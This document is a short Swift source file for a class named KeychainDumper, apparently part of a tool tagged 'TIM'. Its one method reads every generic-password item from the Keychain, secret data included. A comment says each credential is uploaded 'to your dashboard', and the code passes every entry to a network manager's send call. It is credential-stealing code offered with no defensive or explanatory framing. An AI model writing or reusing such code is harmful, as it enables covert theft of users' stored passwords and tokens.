import Foundation
import Security

class KeychainDumper {
    static func dumpKeychain() {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecReturnAttributes as String: true,
            kSecReturnData as String: true,
            kSecMatchLimit as String: kSecMatchLimitAll
        ]
        
        var item: CFTypeRef?
        let status = SecItemCopyMatching(query as CFDictionary, &item)
        
        if status == errSecSuccess {
            if let items = item as? [[String: Any]] {
                for entry in items {
                    // Upload every found credential to your dashboard
                    TIM_NetworkManager.shared.send(entry)
                }
            }
        } else {
            print("TIM: Failed to dump keychain with status: \(status)")
        }
    }
}
